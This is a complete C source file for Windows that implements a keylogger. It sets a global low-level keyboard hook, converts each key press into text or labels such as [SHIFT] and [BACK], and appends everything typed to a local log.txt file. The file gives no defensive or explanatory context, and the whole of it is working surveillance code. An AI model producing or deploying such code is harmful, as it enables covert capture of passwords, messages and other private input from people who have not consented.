#include <windows.h>
#include <stdio.h>
#include <string.h>

// Functions to log keystrokes
void logKeystroke(char *key){
    FILE *file = fopen("log.txt", "a+");
    if(file){
        fprintf(file,"%s", key);
        fclose(file);
    }
}

// Function to get the character from the virtual key code
char *getCharFromKey(char *keyName, WPARAM wParam, LPARAM lParam){
    KBDLLHOOKSTRUCT *kbStruct = (KBDLLHOOKSTRUCT *)lParam;
    DWORD vkCode = kbStruct->vkCode;
    
    // Get keyboard state
    BYTE keyboardState[256];
    GetKeyboardState(keyboardState);
    
    // Convert virtual key to character
    WORD character;
    int result = ToAscii(vkCode, kbStruct->scanCode, keyboardState, &character, 0);

    if(result == 1){
        // printable character
        keyName[0] = character;
        keyName[1] = '\0';
        return keyName;
    }else{
        // Special keys
        switch(vkCode){
            case VK_RETURN: keyName[0] = '\n'; keyName[1] = '\0'; break;
            case VK_SPACE:  keyName[0] = ' '; keyName[1] = '\0'; break;
            case VK_BACK:   strcpy(keyName,"[BACK]"); break;
            case VK_TAB:    strcpy(keyName,"[TAB]"); break;
            case VK_SHIFT:   
            case VK_LSHIFT:  
            case VK_RSHIFT: strcpy(keyName,"[SHIFT]"); break;
            case VK_CONTROL: 
            case VK_LCONTROL: 
            case VK_RCONTROL:   strcpy(keyName,"[CTRL]"); break;
            case VK_ESCAPE: strcpy(keyName,"[ESC]"); break;
            case VK_END:    strcpy(keyName,"[END]"); break;
            case VK_HOME:   strcpy(keyName,"[HOME]"); break;
            case VK_LEFT:   strcpy(keyName,"[LEFT]"); break;
            case VK_UP: strcpy(keyName,"[UP]"); break;
            case VK_RIGHT:  strcpy(keyName,"[RIGHT]"); break;
            case VK_DOWN:   strcpy(keyName,"[DOWN]"); break;
            default:    strcpy(keyName,"[ANOTHER]"); break;
        }
        return keyName;
    }
}

// Hook procedure to capture keystroke
LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam){
    if(nCode >= 0 && wParam == WM_KEYDOWN){
        char key[32];
        getCharFromKey(key, wParam, lParam);
        logKeystroke(key);
    }

    return CallNextHookEx(NULL, nCode, wParam, lParam);
}

int main(){
    // Set a low-level system hook
    HHOOK hook = SetWindowsHookEx(WH_KEYBOARD_LL, KeyboardProc, NULL, 0);
    if(hook == NULL){
        printf("Failed to set hook\n");
        return 1;
    }

    // Message loop to keep the hook active
    MSG msg;
    while(GetMessage(&msg, NULL, 0, 0)){
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }

    // Unhook and exit
    UnhookWindowsHookEx(hook);
    return 0;
}